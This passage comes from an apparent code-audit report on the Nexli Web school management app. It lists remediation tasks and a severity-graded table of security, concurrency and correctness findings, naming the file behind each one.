| 36 | Set up GitHub Actions CI/CD (typecheck → test:rules → deploy) | Separate rules deploy from hosting deploy |
| 37 | Configure Firestore scheduled exports (daily backup to GCS) | Requires Blaze tier; only real disaster recovery path |
| 38 | Set up Firebase quota alerts at 35K reads/day, 15K writes/day | Prevent silent Spark exhaustion before upgrade |
| 39 | Implement route-level lazy loading for all 55+ feature modules | Reduces initial bundle 60–70%; critical for 4G/2G India |
| 40 | Install Vitest and write unit tests for `compute.ts`, `scoring.ts`, `engine.ts`, `salarySchema.ts` | Every financial and grading calculation is untested |
| 41 | Build staff bulk import UI (CSV with invitation email) | 150-staff school requires 150 manual provisioning actions today |
| 42 | Integrate Razorpay for online fee collection | No revenue mechanism without payment gateway |
| 43 | Integrate MSG91 or Fast2SMS for parent SMS notifications | Parent adoption is zero without push; absence + fee due minimum |
| 44 | Build self-serve school trial flow | Every new school currently requires manual Super Admin provisioning |
| 45 | Implement DPDP consent enforcement gate | Consent module exists as a register; must be enforced as a gate before data processing |
| 46 | Deploy Firestore delegation enforcement (not just UI) | Delegation grants currently have no database enforcement |
| 47 | Fix `nextAdmissionNo` with transaction-based counter | Race condition produces duplicate admission numbers under concurrent admits |
| 48 | Fix non-atomic admission flow — batch `createStudent` + `updateAdmission` | Network drop between two writes orphans students |
| 49 | Add payroll approval `runTransaction` (prevent double-approval race) | `finance/data.ts:344` — two approvers can both approve same run |
| 50 | Add duplicate student detection to import flow | No de-duplication against existing Firestore data; mass-duplicate creation possible |

---

## FILE-BY-FILE CRITICAL FINDINGS REFERENCE

| File | Severity | Finding |
|------|----------|---------|
| `serviceAccount.json` | P0 | Live Admin SDK private key — rotate immediately |
| `firestore.rules` (conversations) | P0 | Zero rules for conversations/messages — any member reads all |
| `firestore.rules` (lines 254–257) | P0 | grantedPermissions self-write = privilege escalation |
| `src/lib/firebase.ts` | P0 | App Check not initialized |
| `src/features/visitor/VisitorCheckInPage.tsx` | P0 | Blacklist match does not block check-in |
| `vite.config.ts:49` | P1 | `sourcemap: true` — full source code in production |
| `firebase.json` | P1 | Zero security headers |
| `src/features/visitor/visitorSchema.ts:35` | P1 | `Math.random()` for 4-digit OTP |
| `src/features/certificates/CertificatePreview.tsx:99` | P1 | `dangerouslySetInnerHTML` with user-controlled `accentColor` |
| `src/features/rte/ApplicationsTab.tsx:108–135` | P1 | Promise.all lottery with no transaction; lotteryRank undefined never clears |
| `src/features/hostel/AllocationsTab.tsx:81–116` | P1 | Capacity check + counter update not atomic |
| `src/features/payroll/RunsTab.tsx:100–112` | P1 | Payslips written before run doc; no sentinel |
| `src/features/students/tc/TCDetailPage.tsx:34` | P1 | TC number collides every 10 seconds |
| `src/features/finance/data.ts:85` | P1 | `cancelInvoice()` does not check paidAmount |
| `src/features/insights/PredictionsTab.tsx` | P1 | AT_RISK is a hardcoded array of fake student names |
| `src/features/insights/SmartBriefingTab.tsx` | P1 | SUMMARY is a hardcoded static string |
| `src/features/insights/AssistantsTab.tsx` | P1 | All inputs disabled — entire tab is decorative |
| `src/features/transport/LiveMapTab.tsx` | P1 | vehicle_positions has zero writers; map always shows 0 vehicles |
| `src/features/library/OverdueTab.tsx` | P1 | Fine column displayed; fine never computed anywhere |
| `src/features/canteen/HeadcountTab.tsx` | P1 | No upsert enforcement; double-entry doubles weekly totals |
| `src/features/attendance/MarkAttendancePage.tsx:73` | P2 | `roster.length` as useEffect dep — stale entries on student swap |
| `src/features/transport/BusAttendanceTab.tsx:52` | P2 | Same `roster.length` dep bug |
| `src/features/hostel/RollcallTab.tsx:60` | P2 | Same `roster.length` dep bug |
| `src/features/examinations/ResultsTab.tsx:139–169` | P2 | Promise.all no per-student catch; computeRow inflates max |
| `src/features/payroll/RunDetailPage.tsx:342–343` | P2 | LOP recompute does not recalculate ESI/PT |
| `src/features/school/data.ts:119–124` | P2 | nextAdmissionNo uses getDocs count+1 — race condition |
| `src/features/admissions/AdmissionDetailPage.tsx` | P2 | createStudent + updateAdmission two separate writes |
| `src/lib/provisioning.ts:80` | P2 | Date.now() for secondary app name — same-ms collision |
| `firestore.indexes.json` | P1 | 2 composite indexes for 321 query operations |
| `package.json` | P1 | No Vitest/Jest/any unit test runner |

---

*End of report. 15 independent role-based code reviews of the full Nexli Web codebase. All findings grounded in specific source files and line numbers. Composite launch score: 3.7 / 10.*
